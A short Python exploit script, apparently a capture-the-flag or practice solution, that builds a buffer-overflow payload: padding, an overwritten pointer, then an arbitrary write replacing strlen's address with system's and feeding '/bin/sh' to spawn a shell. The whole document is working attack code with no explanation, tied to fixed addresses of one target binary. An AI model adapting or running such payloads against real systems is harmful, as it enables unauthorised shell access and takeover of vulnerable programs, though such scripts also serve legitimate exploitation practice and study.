import sys
import struct
from pwn import *


pad = "AAAAAAAA"*4
read_addr = struct.pack("<Q", 0x555555755040)
s1 = pad + read_addr + "\n"

strlen = 0x7ffff7aba650


# step 2 arbitrary writing
system = struct.pack("<Q", strlen-0x411d0)
s2 = system + "\n" + "/bin/sh\n"

sys.stdout.write(s1 + s2)
